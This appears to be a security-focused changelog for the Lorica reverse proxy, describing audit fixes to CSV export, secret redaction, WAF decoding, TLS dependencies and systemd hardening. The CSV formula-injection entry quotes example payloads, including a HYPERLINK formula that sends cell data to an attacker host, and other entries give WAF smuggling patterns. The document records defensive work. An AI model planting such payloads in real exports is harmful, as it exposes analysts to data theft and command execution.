- v1.5.2 audit M-2 : access-log CSV export was vulnerable to spreadsheet formula injection. `csv_escape` was RFC 4180-compliant for parsing safety (quote fields containing `"`, `,`, `\n`, `\r`) but did not prepend a leading-apostrophe guard for fields starting with `=`, `+`, `-`, `@`, `\t`, `\r` - the OWASP "CSV / formula injection" attack class. An attacker who controlled any persisted access-log field (request `path`, `host`, `error`, IPv6 `client_ip`) could plant `=cmd|'/c calc'!A1`, `=HYPERLINK("http://attacker/?x="&A1,"click")`, or any other Excel/LibreOffice/Sheets formula ; the SOC analyst opening the exported CSV in their spreadsheet would auto-execute the formula against their own trust context (file-format escape chain, data exfiltration via HYPERLINK, or pop a shell on the older Excel chains). Auth-gated, but the actor inserting the payload is a nominally-anonymous request ; the spreadsheet-opening victim is the operator. CSV downloads have no rate limit. Fixed by prepending `'` (apostrophe) to any field whose first byte is `=`, `+`, `-`, `@`, `\t`, or `\r`. The apostrophe is consumed by the spreadsheet parser so a human-readable export still shows the original payload as a literal text cell. 7 new unit tests pin every guarded prefix + the legitimate-mid-field-dash counter-case + the formula+comma double-wrap (apostrophe goes inside the RFC 4180 quote envelope) + the empty-field counter-case.
- v1.5.2 audit M-1 : `GET /api/v1/notifications` (and the per-id sibling) was leaking webhook bearer tokens and Slack incoming-webhook URLs verbatim. The v1.5.1 audit L-5 widened the **TOML export** scrubber to redact `auth_header` and the webhook `url` for Webhook + Slack channels (a Slack incoming-webhook URL is itself a bearer-style credential ; same shape applies to Discord and Microsoft Teams webhooks). The JSON GET path still relied on the older `mask_sensitive_config` helper, which only masked `smtp_password` for Email and was a no-op for the other two channels. Operators inspecting the dashboard, browser dev-tools, or any corporate proxy log saw live `Bearer ...` tokens and `https://hooks.slack.com/services/T0/B0/SECRET` URLs in clear ; a stolen session (or a screen share during triage) immediately leaked the secret that the export pipeline went out of its way to redact. `mask_sensitive_config` now walks a per-channel field list (`smtp_password` for Email ; `url` + `auth_header` for Webhook + Slack) and substitutes the same `********` sentinel the TOML scrub uses, so the wire shape and the export shape match. `update_notification` extends the existing `********` -> "preserve existing" round-trip from `smtp_password` to `url` + `auth_header` (per-field restore loop with explicit error on missing existing config / corrupt existing JSON / missing field to restore - silent fallthrough would persist the literal mask string and erase the real secret). Dashboard `SettingsNotifications.svelte` mirrors the smtp_password convention : on edit, the URL + auth header form fields are emptied (don't paint the mask into the bound input - `validateUrl("********")` would reject the form), the placeholder switches to "Leave empty to keep current", and the `required` attribute is dropped when editing so an unchanged field isn't blocked. On save, an empty field rolls back to `********` to preserve. Closes the asymmetry the v1.5.1 L-5 work created.
- v1.5.2 audit M-7 : `postcss 8.5.8 -> 8.5.10` (CVE-2026-41305 / GHSA-qx2v-qp2m-jg93, XSS via unescaped `</style>` in `postcss.stringify`). Build-time only (Vite 8 -> Svelte preprocessor -> postcss) ; the XSS sink is not invoked against attacker-controlled CSS in our pipeline (we author all `.css` / `.svelte` at build time), so real exposure to a Lorica deployment is essentially zero. But `pnpm audit` flags it, the supply-chain hygiene matters, and the bump is one lockfile change. Pulled in transitively (no direct dep), so the bump goes through `pnpm.overrides` in `frontend/package.json` rather than a direct dependency declaration : `"postcss": ">=8.5.10"`. svelte-check + vitest + production build all green post-bump.
- v1.5.2 audit H-1 : `rustls-webpki 0.103.12 -> 0.103.13` to close RUSTSEC-2026-0104 (reachable panic when parsing a CRL with an empty `BIT STRING` extension, BEFORE signature verification - reachable any time the proxy parses an attacker-controlled CRL on the mTLS revocation path) + RUSTSEC-2026-0099 (permitted-subtree DNS name constraints accepted certificates asserting a wildcard, weakening name-constraint enforcement on intermediates). The verifier sits behind `rustls 0.23.37` and is reachable on **every** TLS handshake - both server-side (proxy: `lorica-tls`, mTLS) and client-side (`reqwest`, `lettre`, `instant-acme`, `quinn`). SemVer-compatible patch bump, no API surface touched ; `cargo update -p rustls-webpki@0.103.12 --precise 0.103.13` only. The parallel `rustls-webpki 0.101.7` (transitive via `aws-smithy-http-client` -> `rustls 0.21`, gated behind the `route53` Cargo feature) stays on the EOL line - tracked separately for the v1.7.0 deferred dep window.
- v1.5.1 audit L-5 : the TOML config exporter only scrubbed `smtp_password` on the Email notification channel - the Webhook + Slack channels' `url` and `auth_header` fields leaked verbatim. A Slack incoming-webhook URL like `https://hooks.slack.com/services/T0/B0/SECRET` is itself a bearer-style credential (anyone with the URL can post to the channel ; the same shape applies to Discord and Microsoft Teams webhooks) ; `auth_header` carries a literal `Bearer <token>` / `Basic <base64>` for plain HTTP webhooks. Exporter now scrubs `url` + `auth_header` on Webhook + Slack channels alongside the existing Email `smtp_password` redaction. New helper `scrub_secret_field` centralises the "if non-empty string, replace with REDACTED" pattern. Import validator widened from Email-only to every channel (Webhook / Slack rejection messages name the relevant secret kind so the operator knows what to fill back in). Doc-comment on `ExportData::notification_configs` advertises the wider scope. 4 new tests in `lorica-config::tests` (Slack URL redacted + raw token absent, Webhook auth_header redacted + raw token absent, empty webhook fields preserved as-is for clean round-trip, import rejects REDACTED Slack URL with a message naming the channel).
- v1.5.1 audit M-16 (deferred) : the `captcha 1.0` crate (single-maintainer, ~13 months inactive at audit time, 800K downloads) used by `lorica-challenge/src/captcha.rs` for the image-captcha fallback is a latent takeover-risk vector but not exploitable today. The audit recommended vendoring the ~600 LOC pure-Rust crate in-tree (`no_debug` v1.3.0 precedent) OR moving image-captcha rendering to browser-side Canvas. Both options are feat-shaped rewrites (~600 LOC + font handling + image deps, OR full Svelte component + challenge-flow refactor), disproportionate to the patch-cycle contract. Added explicit backlog entry #27 in `docs/backlog.md` with the two options documented + decision criteria. Risk note : operators who configure PoW-only bot protection (default) are unaffected ; the dep path matters only when the image-captcha fallback is wired in.
- v1.5.1 audit L-4 : the hand-rolled OCSP response DER parser in `lorica-tls::ocsp::fetch_ocsp_response` decodes the SEQUENCE length encoding (short form / long form `0x81` / long form `0x82`) and reaches into the ENUMERATED responseStatus field at a computed offset. The audit flagged the `bytes.len() <= status_offset + 2` bound check on the long-form `0x82` path : a response whose DER-declared content length overshoots the actual buffer passes the bound check. Worst case is `try_fetch_ocsp` returning `None` and the proxy serving the request without a stapled OCSP response - best-effort behaviour, no security regression, but the parsing was not pinned against malformed input. Extracted the validation logic into the new pure fn `pub fn validate_ocsp_response_bytes(&[u8]) -> Result<(), String>` so the network-free shape can be fuzz-tested. New `fuzz/fuzz_targets/fuzz_ocsp_response.rs` target pins the no-panic invariant on arbitrary input (`cargo +nightly fuzz run fuzz_ocsp_response`). 7 new unit tests in `ocsp::tests` pin the specific shapes flagged by the audit : empty input rejected, short input rejected, non-SEQUENCE tag rejected, successful short-form accepted, non-zero status rejected, long-form `0x82` content-length overshoot does not panic (returns `Ok` or `Err`, not important which), long-form `0x82` truncated input does not panic. The new target is wired into `.github/workflows/fuzz.yml` alongside `fuzz_waf_evaluate` + `fuzz_api_input` so the weekly Sunday 3 AM UTC schedule + the `workflow_dispatch` manual trigger pick it up automatically.
- v1.5.1 audit L-15 : deps maintenance batch. Three direct deps bumped + their API breaks migrated. (a) `hickory-resolver 0.24 -> 0.26` (DNS resolver, security-sensitive path for the bot-protection rDNS bypass). API rewrite touched `bot_rdns.rs` : `TokioAsyncResolver` renamed to `TokioResolver` (0.25), `::tokio(config, opts)` constructor moved behind a builder (`Resolver::builder_with_config(config, TokioRuntimeProvider::default()).with_options(opts).build()?`, 0.26), `read_system_conf()` now returns `NetError` instead of `io::Error` (mapped via `io::Error::other`), `Lookup::iter() -> &Name` replaced by `Lookup::answers() -> &[Record]` with `RData::PTR` extraction, `NameServerConfig` made `non_exhaustive` with connection-level config (port + protocol + bind_addr) moved into `ConnectionConfig`, `ResolverConfig::new()` removed in favour of `from_parts(domain, search, name_servers)`. Cargo features renamed `tokio-runtime` -> `tokio`. (b) `instant-acme 0.7 -> 0.8` (ACME client). API rewrite touched `acme/{http01,dns01,dns01_manual}.rs` : `Account::create(...)` and `Account::from_credentials(...)` moved onto `AccountBuilder` (`Account::builder()?.create(...)` / `.from_credentials(...)`), `NewOrder` made non-exhaustive (`NewOrder::new(&identifiers)` constructor required), `directory_url` is now an owned `String`, `order.set_challenge_ready(url)` removed in favour of `ChallengeHandle::set_ready()` (per-handle, requires re-walking authorizations to find the challenge by URL in the manual-confirm flow), `order.authorizations()` is now a stream-style iterator (`while let Some(...) = auths.next().await`) yielding `AuthorizationHandle`, `order.finalize(csr.der())` split into `finalize()` (uses internal rcgen, requires `rcgen` feature) and `finalize_csr(csr_der)` (explicit-CSR path, what we use), legacy custom poll loops replaced by `order.poll_ready(&RetryPolicy::default())` and `order.poll_certificate(&RetryPolicy::default())`. Default features pinned to `["ring", "hyper-rustls"]` so the binary does not carry `aws-lc-rs` in parallel with the rest of the workspace. `key_authorization()` returns `KeyAuthorization` directly (no Result), only the DNS-01 path needs `.dns_value()`. (c) `x509-parser 0.16 -> 0.18` (untrusted-cert parsing) - call sites in `certificates.rs` and `routes/mtls.rs` use `parse_x509_certificate` + `prelude::GeneralName::DNSName` + `prelude::ASN1Time`, all stable across the bump. Test results : lorica-api 442 / 442 pass + lorica unit + integration suites green ; the existing wiremock-backed Cloudflare / OVH challenger coverage validates the ACME migration against mocked happy + error paths.
- v1.5.1 audit M-1 : the packaged systemd unit `dist/lorica.service` carried the v1 hardening stack (`ProtectSystem=strict`, `MemoryDenyWriteExecute=yes`, `SystemCallFilter=@system-service`, `LockPersonality=yes`, `CapabilityBoundingSet=CAP_NET_BIND_SERVICE`). Still missing the modern systemd hardening triad that shrinks the post-RCE blast radius. Added : `ProtectClock=yes` (block `settimeofday` / `clock_adjtime`), `ProtectHostname=yes` (block `sethostname`), `ProtectProc=invisible` + `ProcSubset=pid` (hide other services' `/proc` entries and non-pid `/proc` leaks - the single biggest mitigation against a compromised proxy pivoting onto colocated services), `RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX AF_NETLINK` (deny `AF_PACKET` / `AF_CAN` / `AF_BLUETOOTH` / `AF_AX25` etc.), `RemoveIPC=yes` (cleanup POSIX shm / SysV IPC on stop ; Lorica uses `memfd_create` so this is a no-op on the happy path but defends against a compromised process leaving stale segments), `PrivateDevices=yes` (no `/dev/*` raw access), `KeyringMode=private` (per-service kernel keyring), `SystemCallFilter=~@privileged @resources` (subtract `CAP_SYS_ADMIN`-class syscalls and `setrlimit` / `prlimit`). `PrivateUsers=yes` intentionally NOT added (incompatible with `CAP_NET_BIND_SERVICE` for port 80 / 443). `AF_NETLINK` kept because hickory-resolver + glibc internals use it opportunistically. Hardening-guide updated with the full inventory grouped by what each setting denies, plus a `systemctl show lorica | grep ...` verification recipe operators can paste.
- v1.5.1 audit M-12 : `ApiError::Internal(format!("...: {e}"))` flowed the inner String straight through `Display` into the JSON response body via `IntoResponse`. ~84 call sites across `lorica-api` (auth.rs, logs.rs, loadtest.rs, sla.rs, probes.rs, dns_providers.rs, certificates.rs, settings.rs, config.rs, waf.rs, dns01.rs, dns01_manual.rs, http01.rs, renewal.rs, forward_auth.rs, cert_export.rs) built such strings, commonly carrying `rusqlite::Error` text with SQL fragments (`UNIQUE constraint failed: routes.hostname`), file paths under `/var/lib/lorica/...`, and library version banners. An authenticated session was required (the audience was operators), but the dashboard surfaces the raw string in toasts and a screen-captured triage session - or a future federated multi-tenant deployment - turned this into a PII / infrastructure-leak vector. Fixed at the response boundary in `IntoResponse` rather than across all 84 sites : the `ApiError::Internal` arm now logs the full inner detail at `tracing::error!` (operator forensics trail preserved) and emits the generic constant `INTERNAL_USER_MESSAGE = "internal error"` in the JSON body. Other variants (`NotFound`, `BadRequest`, `Unauthorized`, `Forbidden`, `Conflict`, `RateLimited`) carry operator- or user-supplied content that is part of the documented API contract and round-trip verbatim - sanitisation only applies to `Internal`. Two new unit tests in `error::tests` : `test_into_response_internal_does_not_leak_inner_detail` (worst-case SQL + path + version banner detail, asserts the body has the placeholder + byte-scans for none of the leaky tokens), `test_into_response_non_internal_variants_keep_message` (regression pin that the sanitisation does not over-apply to NotFound / BadRequest / etc.).
- v1.5.1 audit L-10 : the bot-protection rDNS bypass populated its cache via a fire-and-forget `tokio::spawn(resolver.resolve_and_cache(ip))` on every cache miss. Two unbounded shapes : (a) N concurrent requests for the same fresh IP allocated N redundant resolve futures (each pending hickory query + forward-confirm round-trip up to ~6 s) ; (b) a botnet flood of unique IPs allocated unbounded async work proportional to attack volume, with no upper bound on memory or task count. Fix : new `RdnsResolver::try_spawn_resolve(self: &Arc<Self>, ip)` method consults a `DashSet<IpAddr>` before spawning - a second concurrent miss for the same fresh IP is a no-op, only the first call spawns the resolve task ; the IP leaves the set when the task completes. Plus a `Semaphore::new(MAX_INFLIGHT_RESOLVES)` (cap = 256, mirrors the existing `MIRROR_SEMAPHORE` precedent in `proxy_wiring/mirror_rewrite.rs`) bounds the absolute number of in-flight resolve tasks ; spawns past the cap are dropped silently, the next request from the same IP retries once a slot frees up. The proxy hot path call site in `proxy_wiring.rs` collapses from a 4-line spawn block to `resolver.try_spawn_resolve(ip_addr);`. 2 new tests in `bot_rdns::tests` (5 concurrent calls for the same IP collapse to 1 in-flight task ; 3 different IPs run 3 in parallel - no false dedup across IPs).
- v1.5.1 audit L-8 : the dashboard `downloadCertificate` flow extracted the filename from the response `Content-Disposition` header via a bare regex (`/filename="([^"]+)"/`) and assigned the captured group verbatim to `<a download>`. The server side already runs `sanitize_filename` on the cert `domain` and falls back to the opaque cert id for unsanitisable names, so the happy path was clean ; but a malformed response, a future server-side regression, or a different endpoint that borrowed the same client code could surface a header with control characters (`NUL`, `CR`, `LF`) or path separators that browsers strip silently and inconsistently. New exported helper `sanitizeFilenameFromHeader(contentDisposition, fallback)` in `lorica-dashboard/frontend/src/lib/api.ts` replaces `[\x00-\x1f]` (C0 controls) and `/` `\` (path separators) with `_`, caps the result at 255 chars (POSIX `NAME_MAX`) so a 4 MiB header value cannot grow the download attribute past what browsers handle, and returns the fallback when the header is missing, malformed, or sanitises to empty. `downloadCertificate` switched to the helper. 8 new vitest cases pin the contract (empty header, no filename token, well-formed name, NUL replacement, CR / LF / tab replacement, forward + backward path separator strip, overlong cap, empty-after-sanitise fallback).
- v1.5.1 audit M-4 : the WAF eval gate `if has_custom_rules || self.prefilter.matches(...)` collapsed two distinct contracts into one - the presence of a single (possibly broad) custom rule disabled the Aho-Corasick prefilter shortcut for the 49 built-in rules on every field of every request, turning every clean request into an `O(rules x fields)` regex scan. A trivially-broad operator-supplied pattern (e.g. `\b(test)\b`) doubled or tripled WAF latency on every clean request - admin misconfiguration amplified into a DoS vector. Split `scan_field` into `scan_builtin_rules` (gated by the prefilter at every call site, restoring PERF-9) and `scan_custom_rules` (run unconditionally when any custom rule is loaded, since custom patterns are unknown at build time and outside the prefilter coverage contract). Eval call sites in `evaluate` (path / query / per-header) and `evaluate_body` updated to call the two halves in sequence : built-ins via the prefilter gate, customs via the `has_custom_rules` gate. Full-scan semantics preserved (a request matching both a custom and a built-in rule still produces both events). 4 new tests in `engine::tests` : custom rule still fires with built-ins loaded ; built-in SQLi still fires when an unrelated custom rule is loaded ; clean request stays clean with a custom rule loaded (regression pin on the new gating) ; custom + built-in can both fire on the same request.
- v1.5.1 audit H-1 followup : `GET /api/v1/settings` now distinguishes "secret never initialised" from "secret in place but masked" by returning the `**REDACTED**` sentinel (parity with the TOML export) when the bot HMAC secret is set, vs an empty string when it has never been generated. The previous unconditional `String::new()` scrub conflated the two states and made it impossible for a dashboard / external tool / audit script to tell whether bot protection was actually ready. The raw hex never appears in either case. Test split into two : `test_get_settings_scrubs_bot_hmac_secret_hex_when_set` (seed a 64-hex secret, assert sentinel + raw absent) and `test_get_settings_returns_empty_bot_hmac_when_not_initialised` (fresh store, assert empty string).
- v1.5.1 audit L-16 : the forked `lorica-tls` crate still imported `rustls-pemfile 2` (RUSTSEC-2025-0134, unmaintained). The runtime crate (`lorica`) had already migrated to `rustls-pki-types::pem` in v1.5.0 ; the forked TLS crate was the last hop on the workspace's outstanding RUSTSEC chain, kept tracked in the threat model T5 transitive-advisories table. Migrated PEM parsing to `rustls-pki-types`'s `PemObject` trait : `CertificateDer::pem_slice_iter` for cert chains and CA bundles, `PrivateKeyDer::from_pem_slice` for keys, `CertificateRevocationListDer::pem_slice_iter` for CRLs. Iterators yield only the section type they were called on, so the previous "match Item variant" pattern collapses to a single typed iteration per call site - cleaner code and no behaviour change. Touched : `load_ca_file_into_store` (now reports a clean error when the bundle has zero certs instead of silently succeeding), `load_certs_and_key_files` (lifetime tightened from generic `<'a>` to `'static` since `from_pem_slice` always copies into owned bytes), `load_pem_file_ca`, `load_pem_file_private_key`, `load_crls_from_file`, and the SNI resolver helpers `parse_certs_from_pem` + `parse_key_from_pem`. The internal `load_pem_file<P>` helper (returning `Vec<Item>`) is gone ; callers read the file once via the new `read_file` helper. `rustls-pki-types` gains the `alloc` + `std` features required by `pem_slice_iter`. `Cargo.toml` doc-comment + `docs/security/threat-model.md` table can drop the RUSTSEC-2025-0134 row in a follow-up commit (the supply-chain backlog item #14 closes alongside this).
- v1.5.1 audit L-3 : the cert-download audit `tracing::warn!` line carried `client_ip + cert_id + domain + part` but **not** the operator's identity. After-incident triage required cross-correlating the session id from the access log against the session table to map "this IP at 03:14" to "this admin user" - extra friction at the worst possible time. The handler now extracts `Extension(session): Extension<Session>` (the `Session` extension is already populated by `require_auth` on every protected route, so no middleware change required) and emits `username` + `user_id` alongside the existing fields. Doc-comment on `download_certificate` updated to advertise the new audit shape. SOC-side answer to "which admin pulled the prod key?" is now a single `journalctl ... | grep -i 'certificate download'` away.
- v1.5.1 audit L-2 : the dashboard `Content-Security-Policy` carried a bare `ws:` token in `connect-src` which admitted WebSocket upgrades to any host (e.g. `ws://attacker.example/`). A page that managed to render a same-origin `<script>` (XSS, CSP-bypass via `data:` injection) could exfiltrate data over an attacker-controlled WebSocket. Tightened to `connect-src 'self' ws://localhost:* ws://127.0.0.1:* ws://[::1]:* wss://localhost:* wss://127.0.0.1:* wss://[::1]:*` - same-origin HTTP via `'self'` plus same-host WebSocket schemes scoped to the loopback addresses Lorica binds the management API to. Port wildcard accommodates the operator-tunable `management_port` setting. CSP is now declared as the module-level `CSP_HEADER` constant for testability ; the `wss://` entries are forward-compatible with the v1.6.0 TLS-on-management-port follow-up (audit M-5, backlog #20). 2 new tests in `lorica-dashboard::tests` (regression pin on the bare `ws:` token, CSP present on SPA fallback path).
- v1.5.1 audit H-4 : the WAF URL decoder cast each percent-decoded byte to `char` via `byte as char`, which maps `u8` (`0..=255`) to Unicode codepoints `U+0000..=U+00FF` and re-encodes them as 1-2 UTF-8 bytes through `String::push`. So `%C3%A9` (UTF-8 for `é`) decoded to two codepoints `U+00C3 U+00A9` instead of the single `U+00E9` ; multi-byte UTF-8 attack signatures (e.g. SQLi vectors with non-ASCII identifiers, XSS via Unicode bracket lookalikes, overlong forms like `%C0%80` for NUL) slipped past every regex anchored on the genuine UTF-8 sequence. The decoder now operates on raw bytes (`Vec<u8>`) and finalises via `String::from_utf8_lossy`, so multi-byte escapes reassemble correctly and overlong forms surface as `U+FFFD` rather than ASCII-aliasing back to the smuggled codepoint. Same patch splits the function into two flavours : `WafEngine::url_decode_uri` (no `+` -> space) for path / header values per RFC 3986, and `WafEngine::url_decode_form` for query strings + form-encoded request bodies. The legacy `WafEngine::url_decode` is kept as an alias for `url_decode_form` (no behaviour change for the tests / downstream callers that did not migrate). Eval call sites updated : `evaluate` uses `_uri` for path + per-header + header-scoped (audit H-3) value decode and `_form` for query ; `evaluate_body` uses `_form`. Removes a long-standing false-positive class on header values (`attacker+payload` no longer decoded to `attacker payload` and no longer trips space-anchored rules like ` or 1=`). 9 new unit tests in `engine::tests` cover : multi-byte `%C3%A9` / `%E2%9C%93` / `%E2%80%A8` round-trip, `%00` NUL preservation, `%C0%80` and `%C0%BC` overlong rejection (REPLACEMENT CHARACTER, not aliased ASCII), invalid `%XX` left literal (`%G1`, `%2`, trailing `%`), `_uri` keeps `+` literal vs `_form` rewrites it, both variants share the percent-escape semantics, and the legacy alias matches form behaviour.
- v1.5.1 audit H-3 : three CRS-derived WAF rules were inert because their patterns expected the literal header NAME to appear inside the SCANNED VALUE (e.g. `(?i)transfer-encoding\s*:.*chunked.*chunked`), but Pingora's HTTP parser pre-splits headers into `(name, value)` tuples before the WAF sees them - the value never carries the name, so the rules never matched. Three named protections (CRS 920100 invalid Content-Length, CRS 920120 trusted-proxy header injection, CRS 920140 Transfer-Encoding chunked-chunked smuggling) appeared in the rule listing UI but did not fire on the attack shapes they advertised. Pingora's strict `httparse` already rejects most CL/TE crossings at the parser level so the practical exposure was bounded, but the inertness itself was a credibility liability. Fix : new `HeaderScopedRule` type (in `lorica_waf::rules`) carries a `target_headers: &'static [&'static str]` allow-list ; the WAF engine grew a dedicated dispatch pass in `evaluate` that matches the header NAME case-insensitively against the allow-list and runs the value-only pattern against the URL-decoded value. The three rules moved out of the main `RuleSet::rules` vec into `RuleSet::header_scoped` with rewritten value-only patterns : 920100 = `^\s*$|[^0-9 \t]` (anything other than digits + whitespace in `Content-Length` is a smuggling indicator), 920120 = `[;&|<>]` (shell metacharacters / HTML brackets, scoped to `x-forwarded-host` / `x-original-url` / `x-rewrite-url`), 920140 = `(?i)chunked.*chunked` (the canonical TE-TE smuggling shape, scoped to `transfer-encoding`). `RuleSet::len()` and `WafEngine::list_rules` / `disable_rule` / `enable_rule` were extended to include both vecs so the rule count stays at 49 and operator-side disable lists keep working unchanged. 11 new unit tests : 3 in `rules::tests` against each rewritten pattern (positive + negative + case-insensitivity) and 8 in `engine::tests` covering the end-to-end dispatch (block on chunked-chunked / invalid-CL / proxy-meta, pass on `chunked` / `gzip, chunked` / valid CL / legitimate proxy-host, name-gated dispatch ignores values on unrelated headers, case-insensitive header name match, scoped-rule disable/enable round-trip, scoped rules surface in `list_rules`).
- v1.5.1 audit H-2 : the WAF request-body scanner truncated past 1 MiB but kept forwarding every byte upstream, so an attacker could prefix 1 MiB of inert padding (HTML comments, JSON noise) before a malicious payload and slip past every signature - none of the SQLi / XSS / SSRF / Log4Shell rules ever saw the actual attack bytes. Effective on every route where `max_request_body_bytes` was unset or larger than 1 MiB. Action on overflow now follows the route's `waf_mode`, mirroring ModSecurity's `SecRequestBodyLimitAction` (`Reject` blocking / `ProcessPartial` detection) and AWS WAF's oversize-handling Continue : (a) **Blocking mode** - the proxy returns `413 Payload Too Large`. Two enforcement points : `request_filter` checks the advertised `Content-Length` upfront so we never buffer a byte we would reject ; `request_body_filter` catches chunked / no-Content-Length cases mid-stream. (b) **Detection mode** - the proxy emits a single `BodyTruncated` `WafEvent` (rule_id 0, category `protocol_violation`, action `detected`, includes the observed body size) the first time the cap is crossed, increments `lorica_waf_events_total{category="protocol_violation",action="detected"}`, and lets the request through with a partial scan on the first `WAF_BODY_SCAN_MAX` bytes. This matches the industry consensus that a detection-only mode must not break legitimate large traffic ; the operator gets a first-class signal in the WAF event log and can decide to flip the route to Blocking or raise the cap (operator-tunable cap is a v1.6.0 candidate in `docs/backlog.md`). The constant was hoisted from a function-local to a module-level `WAF_BODY_SCAN_MAX` ; a new `RequestCtx.waf_body_truncated` flag de-duplicates the event so a chunked body that produces N chunks past the cap emits exactly one event ; a new private helper `LoricaProxy::record_waf_body_truncated` centralises the "log + emit event + bump metric" sequence so both call sites stay in lock-step.
- v1.5.1 audit H-1 : the bot-protection HMAC secret (`bot_hmac_secret_hex` on `GlobalSettings`) was leaking via `GET /api/v1/settings` (the field's own doc claimed it was scrubbed at the API layer ; it was not) and via TOML config export. A leaked hex secret is equivalent to a forgeable bot-protection cookie for every IP across every route until the next certificate renewal rotates it. `get_settings` now overwrites the field with the empty string before serialising (parity with the field's existing doc) ; `export_to_toml` replaces a non-empty secret with the `**REDACTED**` placeholder (parity with `password_hash` / `key_pem` / `smtp_password`) ; an empty / never-initialised secret exports as-is so a fresh store round-trips cleanly and regenerates on first reload after import ; `import_to_store::validate` rejects the `**REDACTED**` placeholder with a clear error so an old export cannot silently rotate a live secret and invalidate every outstanding bot-protection cookie. 3 new unit tests in `lorica-config::tests` (export-redacts-non-empty, export-preserves-empty, import-rejects-redacted) and 1 new handler test in `lorica-api::tests` (`test_get_settings_scrubs_bot_hmac_secret_hex`) pin the behaviour.

## [1.5.1] - 2026-04-21

### Fixed

- Route save in the dashboard failed with `bad request: max_connections must be in 1..=1000000` as soon as the operator hit Save on any route that did not have an explicit per-route max-connections / auto-ban-threshold / return-status configured. Root cause was a semantic mismatch introduced during the v1.5.0 guard-rails pass (Batch 4) : the three fields above are `Option<T>` in the model with `None` standing for "disabled / no limit / no short-circuit" ; the dashboard sends `0` on every UPDATE where the field is blank (per the `empty(0)` helper in `route-form.ts`, so the payload can actively clear a previously-set value) ; `update_route` already normalised `Some(0) => None` before writing to the DB ; but the freshly-added `validate_route_numeric_bounds` ran BEFORE the handler and rejected `0` with the strict `1..=MAX` bound, killing every single route save on a route that had never been configured with a cap. Fix : widen the validator bounds on `max_connections` and `auto_ban_threshold` to `0..=MAX` (0 is semantically equivalent to None via the handler normalisation) and bypass the range check on `return_status == 0` (valid HTTP status codes stay in `100..=599`, so extending the range to `0..=599` would silently let `return_status: 42` through on the wire). `create_route` now also applies the `Some(0) => None` normalisation on six route-level fields that carry the "0 = clear" convention (`max_connections`, `auto_ban_threshold`, `return_status`, `max_request_body_bytes`, `rate_limit_rps`, `rate_limit_burst`) so a raw `curl POST` does not land an incoherent `Some(0)` that would mean "reject every request". `retry_attempts=0` and `cors_max_age_s=0` are deliberately kept as-is because 0 is a valid, distinct configuration for those two fields (explicitly disable retries / do not cache CORS preflights). 5 new unit + integration tests pin the round-trip : `POST /routes {"max_connections":0}` returns 201 with `max_connections: null` in the body, `PUT /routes/:id {"max_connections":0}` clears a previously-set cap without the 400, non-zero values still land inside the documented bounds, and `return_status: 42` is still rejected as an invalid HTTP status.
- Route save also failed with `cache_ttl_s must be in 1..=31536000` on routes running a legitimate always-revalidate cache (TTL 0 on the entry paired with `stale_while_revalidate_s` on top) and with `cache_max_bytes must be in 1..=...` on routes that explicitly wanted no per-entry size cap. Both values are valid runtime configurations : the proxy's `response_cache_filter` computes `fresh_until = now + ttl_s` so a zero TTL stores the entry but marks it immediately expired (equivalent to the origin sending `Cache-Control: max-age=0` — useful with SWR) ; `request_cache_filter` guards `set_max_file_size_bytes` behind `cache_max_bytes > 0` so a zero size cap is the documented "no per-entry limit" sentinel. The v1.5.0 validator had a lower bound of 1 on both fields and rejected values that had been saved on pre-v1.5.0 Loricas, breaking re-save on every route with a 0 TTL. Fix : widen the validator bounds on `cache_ttl_s` and `cache_max_bytes` to `0..=MAX`. Frontend `validateRouteForm` + `validateRouteFormWithTab` mirror the new bound, the cache tab input `min` attribute drops from `1` to `0`, and the in-tab help modal now documents the 0 sentinel semantic for each field. 3 new tests (1 unit on the validator, 1 integration round-trip on PUT then GET, 1 vitest case on the frontend validator) pin the behaviour.
- Server-side 400 responses on route save used to surface as a generic banner in the drawer header with no tab switch, so the operator had to read the field name from the message and navigate manually. New `inferTabFromBackendError` helper parses every message shape emitted by the route handlers (flat field `max_connections must be in ...`, dotted config `bot_protection.cookie_ttl_s must be > 0`, indexed nested `path_rules[3].redirect_to ...`, label-prefixed `forward_auth_response_headers[0]: ...`), extracts the root field or config group, and maps it to the owning tab via the existing `TAB_FIELDS` table plus a small ordered prefix table covering nested config shapes (`bot_protection` → protection, `forward_auth` → security, `path_rules` → routing, `response_rewrite` → transform, etc.). `RouteDrawer::handleSubmit` calls the helper on every 400 from `createRoute` / `updateRoute` and reuses the existing `jumpToErrorTab` to switch + attempt focus. Falls back to "stay on current tab" when the message does not match. 14 new vitest cases cover every shape plus the no-match fallback.
- Dashboard `Total Events` on the Security page plateaued at exactly 10 000 even as new WAF events kept landing in the store. Root cause was a load-and-count pattern in `get_waf_stats` : the handler queried `list_waf_events(10000, None)` and returned `events.len()`, so the counter was silently capped at the page size while the persistent store (retention 100 000) kept growing past it. Replaced the pattern with a new `LogStore::waf_event_stats` method that does the work at the SQL level (`SELECT COUNT(*)` for the total + `SELECT category, COUNT(*) GROUP BY category ORDER BY 2 DESC` for the breakdown), so the counter reflects the real table size and no longer allocates a `Vec<WafEvent>` of up to 10 000 rows just to count them. `get_waf_stats` uses the new method when the persistent store is available and still falls back to the 500-item in-memory ring buffer otherwise. `WafStatsResponse.total_events` + `CategoryCount.count` widened from `usize` to `u64` on the wire (still JSON `number`, TypeScript interface unchanged). 3 new unit tests : the "not capped at 10 000" regression test inserts 10 050 events and asserts the returned total matches, the group-by test confirms descending ordering, the empty-table test confirms the 0 / empty path.
- Same load-and-count pattern audited and fixed in `notification_history` as the WAF stats one. The handler returned `events.len()` as `total`, which would have silently plateaued at the 200-item page size once the notification history grew past it. Today the frontend `NotificationHistoryTab` only displays the array and does not surface the total, so the bug was latent ; the fix keeps the API honest for any future consumer and removes the symmetry break with the WAF fix above. New `LogStore::notification_history_count` uses a plain `SELECT COUNT(*)` ; `notification_history` calls it alongside `list_notification_history(200)` so `events` stays a page and `total` is the real row count. 2 new unit tests (regression pin : insert 250 events > the 200 page size and assert the count matches ; empty-table assertion).
